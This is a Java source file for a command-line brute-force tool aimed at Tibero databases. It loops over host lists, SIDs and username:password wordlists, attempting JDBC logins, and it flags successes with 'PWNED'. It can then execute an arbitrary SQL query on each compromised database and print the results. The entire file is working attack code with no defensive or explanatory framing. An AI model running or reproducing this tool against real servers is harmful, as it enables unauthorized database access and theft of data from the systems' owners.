import java.io.BufferedReader;
import java.io.File;
import java.io.FileReader;
import java.sql.Connection;
import java.sql.DriverManager;
import java.sql.ResultSet;
import java.sql.ResultSetMetaData;
import java.sql.SQLException;
import java.sql.Statement;
import java.util.ArrayList;
import java.util.List;

public class Tibero {

	static Connection conn = null;

	public static final String ANSI_RESET = "\u001B[0m";
	public static final String ANSI_RED = "\u001B[31m";
	public static final String ANSI_GREEN = "\u001B[32m";

	public static void error(String str) {
		System.out.println(ANSI_RED + str + ANSI_RESET);
	}

	public static void success(String str) {
		System.out.println(ANSI_GREEN + str + ANSI_RESET);
	}

	public static void help() {

		System.out.println("-p|--port PORT_NUMBER (default 8629)");
		System.out.println("-s|--sid SID ");
		System.out
				.println("-sf|--sid_file SIDFILE - file containing sids one per line");
		System.out
				.println("-uo|--user_pass  - file containing username:password one per line");
		System.out.println("-sl|--sleep TIMEOUT default 0");
		System.out.println("-e|--execute QUERY - execute query after login");
		System.exit(1);
	}

	public static List<String> readFile(String path) {
		List<String> ret = new ArrayList<String>();
		try {

			BufferedReader br = new BufferedReader(new FileReader(path));
			String line;
			while ((line = br.readLine()) != null) {
				ret.add(line);
			}
			br.close();
		} catch (Exception e) {
			System.out.println(e.getMessage());
		}
		return ret;
	}

	public static void main(String[] args) {
		List<String> hosts = new ArrayList<String>();
		String PORT = "8629";
		String SID_FILE = "";
		String USER_PASSFILE = "";
		Integer sleepDelay = 0;
		String IPFile = "";
		String executeQuery = "";
		List<String> SIDS = new ArrayList<String>();
		List<String> USER_PASS = new ArrayList<String>();
		for (int i = 0; i < args.length; i++) {
			if (args[i].equalsIgnoreCase("-p")
					|| args[i].equalsIgnoreCase("--port")) {
				if (i + 1 < args.length) {
					PORT = args[i + 1];
					i++;
					continue;
				}
			} else if (args[i].equalsIgnoreCase("-s")
					|| args[i].equalsIgnoreCase("--sid")) {
				if (i + 1 < args.length) {
					SIDS.add(args[i + 1]);
					i++;
					continue;
				}
			} else if (args[i].equalsIgnoreCase("-sf")
					|| args[i].equalsIgnoreCase("--sid_file")) {
				if (i + 1 < args.length) {
					SID_FILE = args[i + 1];
					i++;
					continue;
				}
			} else if (args[i].equalsIgnoreCase("-upf")
					|| args[i].equalsIgnoreCase("--user_pass_file")) {
				if (i + 1 < args.length) {
					USER_PASSFILE = args[i + 1];
					i++;
					continue;
				}
			} else if (args[i].equalsIgnoreCase("-up")
					|| args[i].equalsIgnoreCase("--user_pass")) {
				if (i + 1 < args.length) {
					USER_PASS.add(args[i + 1]);
					i++;
					continue;
				}
			} else if (args[i].equalsIgnoreCase("-sl")
					|| args[i].equalsIgnoreCase("--sleep")) {
				if (i + 1 < args.length) {
					sleepDelay = Integer.parseInt(args[i + 1]);
					i++;
					continue;
				}
			} else if (args[i].equalsIgnoreCase("-e")
					|| args[i].equalsIgnoreCase("--execute")) {
				if (i + 1 < args.length) {
					executeQuery = args[i + 1];
					i++;
					continue;
				}
			} else {
				IPFile = args[i];
			}

		}
		// check if IPFile not file ( host or direct IP)
		File f = new File(IPFile);
		if (f.exists() && !f.isDirectory()) {
			for (String host : readFile(IPFile)) {
				hosts.add(host);
			}
		} else {
			hosts.add(IPFile + ":" + PORT);
		}

		if (hosts.size() == 0 || USER_PASSFILE.length() == 0) {
			help();
		}

		try {
			Class.forName("com.tmax.tibero.jdbc.TbDriver");
		} catch (ClassNotFoundException e) {
			System.out.println(e.getMessage());
			System.exit(1);
		}
		if (SID_FILE.length() > 1) {
			for (String tmp : readFile(SID_FILE)) {
				SIDS.add(tmp);
			}
		}

		if (USER_PASSFILE.length() > 1) {
			for (String tmp : readFile(USER_PASSFILE)) {
				USER_PASS.add(tmp);
			}
		}
		System.out.println("LOADED SIDS:" + SIDS.size());
		System.out.println("LOADED AUTH:" + USER_PASS.size());
		for (String host : hosts) {
			bruteforce(host, sleepDelay, SIDS, USER_PASS, executeQuery);
		}
	}

	public static void bruteforce(String address, Integer delay,
			List<String> SIDS, List<String> USER_PASS, String executeQuery)

	{
		boolean isConnected = false;
		String login;
		String password;
		String URL;

		System.out.println("ATTACKING:" + address);
		for (String sid : SIDS) {
			for (String auth_data : USER_PASS) {
				isConnected = false;
				try {
					Thread.sleep(delay);
				} catch (InterruptedException e1) {
					System.out.println(e1.getMessage());
				}
				if (auth_data.split(":", 2).length != 2)
					continue;
				login = auth_data.split(":", 2)[0];
				password = auth_data.split(":", 2)[1];
				try {
					URL = "jdbc:tibero:thin:@" + address + ":" + sid;

					conn = DriverManager.getConnection(URL, login, password);

					isConnected = true;
				} catch (SQLException e) {
					error(address + ":" + sid + ":" + login + ":" + password);
					error(e.getMessage());

				}

				if (isConnected) {

					success(address + ":" + sid + ":" + login + ":" + password
							+ "=====>PWNED");
					if (executeQuery.length() > 0) {
						executeQuery(executeQuery);
					}
					disconnect();

				}
			}
		}
	}

	public static void executeQuery(String query) {
		Statement stmt = null;
		ResultSet rs = null;
		int columnsNumber = 0;
		success("Executing query");
		StringBuffer str = new StringBuffer();
		try {
			stmt = conn.createStatement();
			rs = stmt.executeQuery(query);
			ResultSetMetaData rsmd = rs.getMetaData();
			columnsNumber = rsmd.getColumnCount();
			while (rs.next()) {
				str.setLength(0);
				for (int i = 1; i <= columnsNumber; i++) {
					if (i > 1)
						str.append(",  ");

					str.append(rs.getString(i) + " " + rsmd.getColumnName(i));
				}
				success(str.toString());
			}

		} catch (SQLException e) {
			error(e.getMessage());
		}
	}

	public static void disconnect() {
		try {

			if (conn != null)
				conn.close();
		} catch (Exception ex) {
			System.out.println(ex.getMessage());
		} finally {

			if (conn != null)
				try {
					conn.close();
				} catch (Exception e) {
					System.out.println(e.getMessage());
				}
		}
	}

}
